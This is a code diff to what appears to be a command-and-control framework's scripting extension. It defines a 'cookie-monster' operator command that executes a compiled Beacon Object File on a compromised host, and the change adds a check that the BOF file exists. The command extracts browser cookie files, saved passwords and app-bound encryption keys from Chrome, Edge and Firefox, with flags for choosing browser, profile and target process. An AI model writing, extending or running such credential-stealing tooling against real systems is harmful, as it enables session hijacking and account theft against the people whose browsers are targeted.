@@ -1,5 +1,18 @@
 
 var cmd_cookie_monster = ax.create_command("cookie-monster", "Locate and copy the cookie file used for Edge/Chrome/Firefox", "cookie-monster [ -b [chrome || msedge || firefox] [--cookie-only || --key-only || --password-only] [pid] ] or [--profile <Local State File Path> <PID>]");
+
+function cookie_monster_bof_path(id) {
+    let arch = ax.arch(id);
+    let bof_path = ax.script_dir() + "_bin/cookie-monster-bof." + arch + ".o";
+    if (!ax.file_exists(bof_path)) {
+        throw new Error(
+            "Cookie-Monster artifact is missing: cookie-monster-bof." + arch + ".o. " +
+            "Build it with make -C Extension-Kit/Creds-BOF, then reload the Creds-BOF AxScript."
+        );
+    }
+    return bof_path;
+}
+
 cmd_cookie_monster.addArgFlagString( "-b", "browser",        "Extract data from 'chrome', 'msedge', 'firefox' or 'all'", "");
 cmd_cookie_monster.addArgFlagString( "--profile", "profile", "Extract from custom browser profile path as system", "");
 cmd_cookie_monster.addArgBool(       "--cookie-only",        "Only retrieve the Cookie file. Do not attempt to download Login Data file or retrieve app bound encryption key.");
@@ -45,7 +58,7 @@ cmd_cookie_monster.setPreHook(function (id, cmdline, parsed_json, ...parsed_line
 
     if( (dumpKey && dumpCookie) || (dumpKey && dumpPassword) || (dumpPassword && dumpCookie) ) { throw new Error("--key-only cannot be used with --cookie-only or --passwords-only"); }
 
-    let bof_path = ax.script_dir() + "_bin/cookie-monster-bof." + ax.arch(id) + ".o";
+    let bof_path = cookie_monster_bof_path(id);
     let bof_params = ax.bof_pack("cstr,cstr,int,int,int,int,int,int", [ browser, profile, browserPid, dumpCookie, dumpPassword, dumpKey, cookiePid, passwordPid]);
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Running Cookie-Monster BOF");
 });
